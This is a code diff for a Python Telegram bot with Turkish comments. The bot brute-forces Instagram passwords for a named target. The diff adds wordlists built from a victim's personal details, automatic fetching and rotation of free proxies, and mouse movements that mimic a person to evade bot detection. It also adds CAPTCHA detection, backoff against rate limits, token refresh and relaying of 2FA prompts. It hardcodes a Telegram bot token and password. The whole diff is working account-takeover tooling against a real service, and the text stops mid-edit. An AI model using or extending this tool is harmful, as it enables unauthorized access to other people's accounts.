@@ -22,6 +22,7 @@ from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.common.action_chains import ActionChains
 from selenium.common.exceptions import TimeoutException, NoSuchElementException
 from urllib.parse import quote
 import os
@@ -35,6 +36,9 @@ TOKEN = "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU"
 
 # Güvenlik şifresi
 BOT_PASSWORD = "vio1911"
+
+# Proxy API (ücretsiz proxy listesi)
+PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
 
 # CUPP tarzı şifre oluşturucu için yapılandırma
 class PasswordGenerator:
@@ -50,15 +54,16 @@ class PasswordGenerator:
             's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
         }
         self.max_password_length = 512  # Şifre uzunluk sınırı
+        self.max_passwords = 100000  # Maksimum şifre sayısı
 
     def generate_wordlist(self, profile: dict) -> List[str]:
         wordlist = []
-        firstname = profile.get("firstname", "").lower()[:20]  # Input uzunluk sınırı
+        firstname = profile.get("firstname", "").lower()[:20]
         lastname = profile.get("lastname", "").lower()[:20]
         birthdate = profile.get("birthdate", "").replace("/", "")[:8]
         pet = profile.get("pet", "").lower()[:20]
         company = profile.get("company", "").lower()[:20]
-        keywords = [k[:20] for k in profile.get("keywords", [])]  # Her kelime 20 karaktere sınırlı
+        keywords = [k[:20] for k in profile.get("keywords", [])]
 
         # Temel kelimeler
         base_words = [word for word in [firstname, lastname, pet, company] if word]
@@ -86,6 +91,8 @@ class PasswordGenerator:
 
         # Çift kelime kombinasyonları
         for w1, w2 in itertools.combinations(base_words, 2):
+            if len(wordlist) >= self.max_passwords:
+                break
             if len(f"{w1}{w2}") <= self.max_password_length:
                 wordlist.append(f"{w1}{w2}")
                 wordlist.append(f"{w2}{w1}")
@@ -110,6 +117,8 @@ class PasswordGenerator:
                                     new_variations.append(new_var)
                     leet_variations.extend(new_variations)
                 leet_words.extend(leet_variations)
+                if len(wordlist) + len(leet_words) >= self.max_passwords:
+                    break
             wordlist.extend(leet_words)
 
         # Özel karakterler
@@ -122,6 +131,8 @@ class PasswordGenerator:
                     for char2 in self.config["chars"]:
                         if len(f"{word}{char}{char2}") <= self.max_password_length:
                             special_words.append(f"{word}{char}{char2}")
+                if len(wordlist) + len(special_words) >= self.max_passwords:
+                    break
             wordlist.extend(special_words)
 
         # Rastgele sayılar
@@ -131,9 +142,13 @@ class PasswordGenerator:
                 for num in range(self.config["numfrom"], self.config["numto"] + 1):
                     if len(f"{word}{num:02d}") <= self.max_password_length:
                         numbered_words.append(f"{word}{num:02d}")
+                    if len(wordlist) + len(numbered_words) >= self.max_passwords:
+                        break
+                if len(wordlist) + len(numbered_words) >= self.max_passwords:
+                    break
             wordlist.extend(numbered_words)
 
-        return list(set(wordlist))  # Tekrar edenleri kaldır
+        return list(set(wordlist))[:self.max_passwords]  # Tekrar edenleri kaldır ve sınırı uygula
 
 class InstagramBruteForce:
     """Instagram brute-force işlemleri için sınıf - 2025 güncel versiyon."""
@@ -141,6 +156,7 @@ class InstagramBruteForce:
     def __init__(self, user_agent: str = None, proxy_list: List[str] = None):
         self.user_agent = user_agent or self._get_realistic_user_agent()
         self.proxy_list = proxy_list or []
+        self.proxy_cache = {}  # Proxy durum takibi: {proxy: {status: "working"/"banned", last_used: timestamp}}
         self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
         self.current_proxy = None
         self.login_url = 'https://www.instagram.com/accounts/login/'
@@ -161,6 +177,61 @@ class InstagramBruteForce:
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
         ]
         return random.choice(agents)
+
+    def _fetch_proxy_list(self):
+        """Çevrimiçi proxy listesi çekme"""
+        try:
+            response = requests.get(PROXY_API_URL, timeout=10)
+            if response.status_code == 200:
+                proxies = response.text.splitlines()
+                self.proxy_list.extend([p for p in proxies if p not in self.proxy_list])
+                self.proxy_cycle = itertools.cycle(self.proxy_list)
+                logger.debug(f"Yeni proxy'ler alındı: {len(proxies)} adet")
+                return True
+            else:
+                logger.error(f"Proxy API hatası: HTTP {response.status_code}")
+                return False
+        except Exception as e:
+            logger.error(f"Proxy API hatası: {e}")
+            return False
+
+    def _get_working_proxy(self, progress_callback: Optional[callable] = None):
+        if not self.proxy_list or not self.proxy_cycle:
+            if progress_callback:
+                progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
+            return None
+        
+        for _ in range(len(self.proxy_list)):
+            proxy = next(self.proxy_cycle)
+            if proxy in self.proxy_cache and self.proxy_cache[proxy]['status'] == 'banned':
+                continue
+            try:
+                test_session = requests.Session()
+                test_session.proxies = {'http': proxy, 'https': proxy}
+                response = test_session.get('https://www.instagram.com', timeout=5)
+                if response.status_code == 200:
+                    test_session.close()
+                    self.proxy_cache[proxy] = {'status': 'working', 'last_used': time.time()}
+                    logger.debug(f"Çalışan proxy bulundu: {proxy}")
+                    if progress_callback:
+                        progress_callback(f"✅ Çalışan proxy bulundu: {proxy}")
+                    return proxy
+                else:
+                    self.proxy_cache[proxy] = {'status': 'banned', 'last_used': time.time()}
+                    logger.warning(f"Proxy başarısız: {proxy}, HTTP {response.status_code}")
+            except Exception as e:
+                self.proxy_cache[proxy] = {'status': 'banned', 'last_used': time.time()}
+                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
+            asyncio.sleep(1)
+        
+        # Proxy'ler biterse yeni liste çek
+        if self._fetch_proxy_list():
+            return self._get_working_proxy(progress_callback)
+        
+        logger.error("Hiçbir proxy çalışmıyor!")
+        if progress_callback:
+            progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
+        return None
 
     def _initialize(self):
         self.session = requests.Session()
@@ -184,33 +255,6 @@ class InstagramBruteForce:
             if self.current_proxy:
                 self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                 logger.debug(f"Başlangıç proxy'si ayarlandı: {self.current_proxy}")
-
-    def _get_working_proxy(self, progress_callback: Optional[callable] = None):
-        if not self.proxy_list or not self.proxy_cycle:
-            if progress_callback:
-                progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
-            return None
-        for _ in range(len(self.proxy_list)):
-            proxy = next(self.proxy_cycle)
-            try:
-                test_session = requests.Session()
-                test_session.proxies = {'http': proxy, 'https': proxy}
-                response = test_session.get('https://www.instagram.com', timeout=5)
-                if response.status_code == 200:
-                    test_session.close()
-                    logger.debug(f"Çalışan proxy bulundu: {proxy}")
-                    if progress_callback:
-                        progress_callback(f"✅ Çalışan proxy bulundu: {proxy}")
-                    return proxy
-                else:
-                    logger.warning(f"Proxy başarısız: {proxy}, HTTP {response.status_code}")
-            except Exception as e:
-                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
-            asyncio.sleep(1)
-        logger.error("Hiçbir proxy çalışmıyor!")
-        if progress_callback:
-            progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
-        return None
 
     def _setup_selenium(self):
         options = Options()
@@ -264,7 +308,7 @@ class InstagramBruteForce:
             except Exception as e:
                 logger.error(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
                 if progress_callback:
-                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                    await progress_callback(f"🔍 Token bulmaya çalışıyorum, sabret... ({attempt}/{max_attempts})")
                 if attempt < max_attempts:
                     await asyncio.sleep(5)
                 continue
@@ -279,23 +323,42 @@ class InstagramBruteForce:
                 self.current_proxy = self._get_working_proxy(progress_callback)
                 if self.current_proxy:
                     if progress_callback:
-                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                        await progress_callback(f"🔍 Proxy ile token alınıyor: {self.current_proxy}")
                 else:
                     self.current_proxy = None
                     if progress_callback:
-                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                        await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")
             
             if not self._setup_selenium():
                 if progress_callback:
-                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                    await progress_callback("❌ Selenium başlatılamadı, tekrar deniyorum...")
                 await asyncio.sleep(5)
                 attempt += 1
                 continue
             try:
                 self.driver.get('https://www.instagram.com/')
-                time.sleep(3)
+                # Rastgele fare hareketleri
+                actions = ActionChains(self.driver)
+                for _ in range(random.randint(2, 5)):
+                    actions.move_by_offset(random.randint(-50, 50), random.randint(-50, 50)).pause(random.uniform(0.1, 0.5))
+                actions.perform()
+                time.sleep(random.uniform(2, 4))
+                
                 self.driver.get(self.login_url)
-                time.sleep(2)
+                time.sleep(random.uniform(1, 3))
+                
+                # CAPTCHA kontrolü
+                try:
+                    captcha = WebDriverWait(self.driver, 5).until(
+                        EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'robot')] | //*[contains(@class, 'g-recaptcha')]"))
+                    )
+                    if captcha:
+                        if progress_callback:
+                            await progress_callback("🚨 CAPTCHA tespit edildi! Lütfen manuel olarak çöz: https://www.instagram.com/accounts/login/")
+                        return False
+                except TimeoutException:
+                    pass
+                
                 csrf_token = self.driver.get_cookie('csrftoken')
                 if csrf_token:
                     self.csrf_token = csrf_token['value']
@@ -316,7 +379,7 @@ class InstagramBruteForce:
             except Exception as e:
                 logger.error(f"Selenium token alma hatası (Deneme {attempt}): {e}")
                 if progress_callback:
-                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
+                    await progress_callback(f"🔍 Token alma hatası, tekrar deniyorum... ({attempt})")
                 await asyncio.sleep(5)
                 attempt += 1
             finally:
@@ -359,7 +422,7 @@ class InstagramBruteForce:
                 f.write(f"Şifre: {password}, Hata: {str(e)}\n")
             return None
 
-    def _selenium_login_attempt(self, username: str, password: str):
+    def _selenium_login_attempt(self, username: str, password: str, progress_callback: Optional[callable] = None):
         if not self._setup_selenium():
             return "ERROR"
         try:
@@ -367,6 +430,13 @@ class InstagramBruteForce:
             WebDriverWait(self.driver, 10).until(
                 EC.presence_of_element_located((By.NAME, "username"))
             )
+            
+            # Rastgele fare hareketleri
+            actions = ActionChains(self.driver)
+            for _ in range(random.randint(2, 5)):
+                actions.move_by_offset(random.randint(-50, 50), random.randint(-50, 50)).pause(random.uniform(0.1, 0.5))
+            actions.perform()
+            
             username_field = self.driver.find_element(By.NAME, "username")
             password_field = self.driver.find_element(By.NAME, "password")
             for char in username:
@@ -378,8 +448,22 @@ class InstagramBruteForce:
                 time.sleep(random.uniform(0.1, 0.3))
             time.sleep(random.uniform(1, 2))
             login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
-            login_button.click()
+            
+            # Tıklama öncesi rastgele hareket
+            actions.move_to_element(login_button).pause(random.uniform(0.5, 1)).click().perform()
             time.sleep(5)
+            
+            # CAPTCHA kontrolü
+            try:
+                captcha = WebDriverWait(self.driver, 5).until(
+                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'robot')] | //*[contains(@class, 'g-recaptcha')]"))
+                )
+                if captcha and progress_callback:
+                    progress_callback("🚨 CAPTCHA tespit edildi! Lütfen manuel olarak çöz: https://www.instagram.com/accounts/login/")
+                return "CAPTCHA"
+            except TimeoutException:
+                pass
+            
             current_url = self.driver.current_url
             page_source = self.driver.page_source
             if any(indicator in current_url for indicator in ['/', '/direct/', '/explore/', '/accounts/onetap/']):
@@ -393,11 +477,15 @@ class InstagramBruteForce:
                 logger.debug("Selenium: 2FA gerekli")
                 with open('instagram_response.json', 'a', encoding='utf-8') as f:
                     f.write(f"Şifre: {password}, Selenium: 2FA gerekli\n")
+                if progress_callback:
+                    progress_callback("🔐 2FA gerekli! Lütfen Instagram uygulamasından 6 haneli kodu al ve buraya gir:")
                 return "2FA"
             if 'checkpoint' in current_url or 'challenge' in current_url:
                 logger.debug("Selenium: Checkpoint gerekli")
                 with open('instagram_response.json', 'a', encoding='utf-8') as f:
                     f.write(f"Şifre: {password}, Selenium: Checkpoint gerekli\n")
+                if progress_callback:
+                    progress_callback("🚧 Checkpoint gerekli! Instagram'dan doğrulama yap (e-posta/telefon): https://www.instagram.com/challenge/")
                 return "CHECKPOINT"
             error_indicators = [
                 'Sorry, your password was incorrect',
@@ -447,6 +535,9 @@ class InstagramBruteForce:
         total_passwords = len(password_list)
         potential_passwords = set()
         tried_passwords = 0
+        failed_attempts = 0
+        max_failed = 5
+        backoff_delay = 30  # İlk bekleme süresi (saniye)
         
         try:
             await progress_callback(f"\n{'='*50}\nInstagram Brute Force Başlatılıyor\nHedef: {username}\nToplam şifre: {total_passwords}\nTimeout: {timeout} saniye\n{'='*50}\n")
@@ -476,9 +567,6 @@ class InstagramBruteForce:
         except TelegramError as e:
             logger.error(f"Progress callback error: {e}")
             return None
-
-        failed_attempts = 0
-        max_failed = 5
 
         for i, password in enumerate(password_list):
             if time.time() - start_time > timeout:
@@ -531,13 +619,14 @@ class InstagramBruteForce:
                                 logger.error(f"Progress callback error: {e}")
                         elif json_data.get('two_factor_required'):
                             try:
-                                await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}")
+                                await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}\nLütfen Instagram uygulamasından 6 haneli kodu al ve buraya gir:")
+                                context.user_data['awaiting'] = '2fa_code'  # 2FA kodu için bekle
                             except TelegramError as e:
                                 logger.error(f"Progress callback error: {e}")
                             return password
                         elif json_data.get('checkpoint_url'):
                             try:
-                                await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}")
+                                await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}\nInstagram'dan doğrulama yap (e-posta/telefon): https://www.instagram.com/challenge/")
                             except TelegramError as e:
                                 logger.error(f"Progress callback error: {e}")
                             return password
@@ -558,29 +647,58 @@ class InstagramBruteForce:
                         potential_passwords.add(password)
                         try:
                             await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
-                            result = self._selenium_login_attempt(username, password)
+                            result = self._selenium_login_attempt(username, password, progress_callback)
                         except TelegramError as e:
                             logger.error(f"Progress callback error: {e}")
                 elif response.status_code == 429:
                     potential_passwords.add(password)
                     try:
-                        await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
-                        await asyncio.sleep(30)
-                        result = self._selenium_login_attempt(username, password)
+                        await progress_callback(f"⚠️ Çok fazla istek (429)! {backoff_delay}s bekleniyor...")
+                        await asyncio.sleep(backoff_delay)
+                        backoff_delay = min(backoff_delay * 2, 600)  # Üstel geri çekilme, max 10dk
+                        result = self._selenium_login_attempt(username, password, progress_callback)
+                    except TelegramError as e:
+                        logger.error(f"Progress callback error: {e}")
+                elif response.status_code == 403:  # Token geçersiz olabilir
+                    try:
+                        await progress_callback("🔍 Token geçersiz, yenileniyor...")
+                        success = await self._get_initial_cookies_and_tokens(progress_callback)
+                        if not success:
+                            await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
+                            success = await self._selenium_get_tokens(progress_callback)
+                        if success:
+                            await progress_callback("✅ Token'lar yenilendi, şifre tekrar deneniyor...")
+                            response = self._make_login_request(username, password)
+                            if response and response.status_code == 200:
+                                json_data = response.json()
+                                if json_data.get('authenticated'):
+                                    await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
+                                    return password
+                                elif json_data.get('two_factor_required'):
+                                    await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}\nLütfen Instagram uygulamasından 6 haneli kodu al ve buraya gir:")
+                                    context.user_data['awaiting'] = '2fa_code'
+                                    return password
+                                elif json_data.get('checkpoint_url'):
+                                    await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}\nInstagram'dan doğrulama yap: https://www.instagram.com/challenge/")
+                                    return password
+                            result = "ERROR"
+                        else:
+                            await progress_callback("❌ Token'lar yenilenemedi, devam ediyorum...")
+                            result = self._selenium_login_attempt(username, password, progress_callback)
                     except TelegramError as e:
                         logger.error(f"Progress callback error: {e}")
                 else:
                     potential_passwords.add(password)
                     try:
                         await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
-                        result = self._selenium_login_attempt(username, password)
+                        result = self._selenium_login_attempt(username, password, progress_callback)
                     except TelegramError as e:
                         logger.error(f"Progress callback error: {e}")
             else:
                 potential_passwords.add(password)
                 try:
                     await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
-                    result = self._selenium_login_attempt(username, password)
+                    result = self._selenium_login_attempt(username, password, progress_callback)
                 except TelegramError as e:
                     logger.error(f"Progress callback error: {e}")
 
@@ -592,16 +710,24 @@ class InstagramBruteForce:
                 return password
             elif result == "2FA":
                 try:
-                    await progress_callback(f"🔐 2FA gerekli! (Selenium) Şifre doğru: {password}")
+                    await progress_callback(f"🔐 2FA gerekli! (Selenium) Şifre doğru: {password}\nLütfen Instagram uygulamasından 6 haneli kodu al ve buraya gir:")
+                    context.user_data['awaiting'] = '2fa_code'
                 except TelegramError as e:
                     logger.error(f"Progress callback error: {e}")
                 return password
             elif result == "CHECKPOINT":
                 try:
-                    await progress_callback(f"🚧 Checkpoint gerekli! (Selenium) Şifre doğru: {password}")
+                    await progress_callback(f"🚧 Checkpoint gerekli! (Selenium) Şifre doğru: {password}\nInstagram'dan doğrulama yap: https://www.instagram.com/challenge/")
                 except TelegramError as e:
                     logger.error(f"Progress callback error: {e}")
                 return password
+            elif result == "CAPTCHA":
+                try:
+                    await progress_callback("🚨 CAPTCHA tespit edildi! Lütfen manuel olarak çöz: https://www.instagram.com/accounts/login/")
+                    return None
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+                    return None
             elif result == "ERROR":
                 potential_passwords.add(password)
                 try:
@@ -618,15 +744,18 @@ class InstagramBruteForce:
                                 self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                                 await progress_callback(f"✅ Yeni proxy ayarlandı: {self.current_proxy}")
                                 failed_attempts = 0
+                                backoff_delay = 30  # Başarılı proxy değişiminde sıfırla
                             else:
                                 await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")
                                 await asyncio.sleep(60)
+                                failed_attempts = 0
                         except TelegramError as e:
                             logger.error(f"Progress callback error: {e}")
                     else:
                         try:
-                            await progress_callback("🔍 60 saniye bekleniyor...")
-                            await asyncio.sleep(60)
+                            await progress_callback(f"🔍 {backoff_delay}s bekleniyor...")
+                            await asyncio.sleep(backoff_delay)
+                            backoff_delay = min(backoff_delay * 2, 600)
                             failed_attempts = 0
                         except TelegramError as e:
                             logger.error(f"Progress callback error: {e}")
@@ -655,10 +784,16 @@ class InstagramBruteForce:
         # İşlem sonu rapor
         report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
         if potential_passwords:
-            report += f"- Kullanıcı adı doğru ama hata alınan şifreler (doğru olabilir, manuel olarak kontrol et): {', '.join(potential_passwords)}\n"
+            report += f"- Kullanıcı adı doğru ama hata alınan şifreler (doğru olabilir, manuel kontrol et): {', '.join(potential_passwords)}\n"
         try:
             await progress_callback(report)
             await progress_callback(f"⏰ Timeout ({timeout}s) aşıldı veya tüm şifreler denendi! Denenen şifre: {tried_passwords}/{total_passwords}")
+            # Log dosyasını gönder
+            if os.path.exists('instagram_response.json'):
+                await progress_callback("📜 İşlem logları gönderiliyor...")
+                await progress_callback.reply_document(
+                    document=InputFile('instagram_response.json', filename='instagram_response.json')
+                )
         except TelegramError as e:
             logger.error(f"Progress callback error: {e}")
         return None
@@ -723,7 +858,8 @@ class TelegramBot:
                     [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                     [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
                     [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
-                    [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
+                    [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')],
+                    [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
                 ]
                 reply_markup = InlineKeyboardMarkup(keyboard)
                 try:
@@ -761,7 +897,6 @@ class TelegramBot:
                 file = await update.message.document.get_file()
                 file_path = f"passwords_{user_id}.txt"
                 await file.download_to_drive(file_path)
-                # Dosyayı oku ve şifreleri kontrol et
                 try:
                     with open(file_path, 'r', encoding='utf-8') as f:
                         passwords = [line.strip() for line in f if line.strip() and len(line.strip()) <= 512]
@@ -841,7 +976,10 @@ class TelegramBot:
                     logger.error(f"Telegram send_message error: {e}")
                 return
             self.user_data[user_id]['password_profile']['firstname'] = firstname
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_lastname')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_lastname')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await update.message.reply_text("📝 Soyadı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -858,7 +996,10 @@ class TelegramBot:
                     logger.error(f"Telegram send_message error: {e}")
                 return
             self.user_data[user_id]['password_profile']['lastname'] = lastname
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await update.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -875,7 +1016,10 @@ class TelegramBot:
                     logger.error(f"Telegram send_message error: {e}")
                 return
             self.user_data[user_id]['password_profile']['birthdate'] = birthdate
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await update.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -892,7 +1036,10 @@ class TelegramBot:
                     logger.error(f"Telegram send_message error: {e}")
                 return
             self.user_data[user_id]['password_profile']['pet'] = pet
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_company')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await update.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -909,7 +1056,10 @@ class TelegramBot:
                     logger.error(f"Telegram send_message error: {e}")
                 return
             self.user_data[user_id]['password_profile']['company'] = company
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await update.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -928,7 +1078,8 @@ class TelegramBot:
                 return
             self.user_data[user_id]['password_profile']['keywords'] = keyword_list
             keyboard = [
-                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
+                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
@@ -937,6 +1088,19 @@ class TelegramBot:
             except TelegramError as e:
                 logger.error(f"Telegram send_message error: {e}")
             return
+        elif awaiting == '2fa_code':
+            code = update.message.text.strip() if update.message.text else ""
+            if not code or not code.isdigit() or len(code) != 6:
+                try:
+                    await update.message.reply_text("❌ Geçersiz 2FA kodu! Lütfen 6 haneli bir kod gir.")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                return
+            try:
+                await update.message.reply_text(f"✅ 2FA kodu alındı: {code}\nBu kodu Instagram'da manuel olarak girmen gerekiyor: https://www.instagram.com/accounts/login/two_factor/")
+                context.user_data['awaiting'] = None
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
 
         context.user_data['awaiting'] = None
         keyboard = [
@@ -946,7 +1110,8 @@ class TelegramBot:
             [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
             [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
             [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
-            [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
+            [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')],
+            [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         try:
@@ -993,7 +1158,8 @@ class TelegramBot:
         elif query.data == 'leet_yes':
             self.user_data[user_id]['password_profile']['leetmode'] = True
             keyboard = [
-                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
+                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
@@ -1004,7 +1170,8 @@ class TelegramBot:
         elif query.data == 'leet_no':
             self.user_data[user_id]['password_profile']['leetmode'] = False
             keyboard = [
-                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')]
+                [InlineKeyboardButton("Evet", callback_data='spechars_yes'), InlineKeyboardButton("Hayır", callback_data='spechars_no')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
@@ -1015,7 +1182,8 @@ class TelegramBot:
         elif query.data == 'spechars_yes':
             self.user_data[user_id]['password_profile']['spechars'] = True
             keyboard = [
-                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
+                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
@@ -1026,7 +1194,8 @@ class TelegramBot:
         elif query.data == 'spechars_no':
             self.user_data[user_id]['password_profile']['spechars'] = False
             keyboard = [
-                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')]
+                [InlineKeyboardButton("Evet", callback_data='randnum_yes'), InlineKeyboardButton("Hayır", callback_data='randnum_no')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
             ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
@@ -1044,7 +1213,10 @@ class TelegramBot:
             await self.start_attack(update, context)
         elif query.data == 'skip_lastname':
             self.user_data[user_id]['password_profile']['lastname'] = ''
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await query.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -1053,7 +1225,10 @@ class TelegramBot:
                 logger.error(f"Telegram send_message error: {e}")
         elif query.data == 'skip_birthdate':
             self.user_data[user_id]['password_profile']['birthdate'] = ''
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await query.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -1062,7 +1237,10 @@ class TelegramBot:
                 logger.error(f"Telegram send_message error: {e}")
         elif query.data == 'skip_pet':
             self.user_data[user_id]['password_profile']['pet'] = ''
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_company')],
+                [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
+            ]
             reply_markup = InlineKeyboardMarkup(keyboard)
             try:
                 await query.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
@@ -1071,7 +1249,10 @@ class TelegramBot:
                 logger.error(f"Telegram send_message error: {e}")
         elif query.data == 'skip_company':
             self.user_data[user_id]['password_profile']['company'] = ''
-            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
+            keyboard = [
+                [InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')],
